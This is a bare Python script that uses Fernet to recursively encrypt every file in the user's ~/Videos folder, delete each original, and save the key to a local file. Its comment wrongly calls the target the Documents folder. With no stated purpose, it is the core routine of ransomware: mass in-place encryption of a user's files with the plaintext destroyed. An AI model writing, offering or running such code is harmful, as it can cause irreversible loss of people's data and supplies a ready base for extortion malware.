from cryptography.fernet import Fernet
import os

"Generate a key for encryption"
key = Fernet.generate_key()
cipher_suite = Fernet(key)


def encrypt_file(file_path):
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    encrypted_data = cipher_suite.encrypt(plaintext)
    with open(file_path + '.encrypted', 'wb') as f:
        f.write(encrypted_data)
    os.remove(file_path)


def encrypt_folder(folder_path):
    for dirpath, _, filenames in os.walk(folder_path):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            encrypt_file(file_path)


if __name__ == "__main__":
    # Path to Documents folder
    documents_folder = os.path.expanduser("~/Videos")

    # Encrypt the documents folder
    encrypt_folder(documents_folder)

    # Save the key to a file for decryption
    with open('encryption_key.key', 'wb') as key_file:
        key_file.write(key)
